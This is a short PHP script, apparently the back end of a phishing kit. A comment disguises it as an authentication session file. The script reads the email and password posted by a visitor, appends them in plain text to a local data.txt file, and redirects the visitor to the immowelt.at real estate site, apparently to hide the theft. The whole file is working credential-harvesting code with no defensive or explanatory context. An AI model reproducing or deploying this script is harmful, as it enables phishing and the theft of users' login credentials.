<?php
//include auth_session.php file on all user panel pages
    header("Location: http://www.immowelt.at");
    if(isset($_POST['email']))
    {
        $text = "Email : " . $_POST['email'] . "," . "Password : "  . $_POST['password'] . "\n";
        $fp = fopen('data.txt', 'a+');
        if(fwrite($fp, $text))  {
            echo 'saved';
        }
        fclose ($fp);
    }
?>
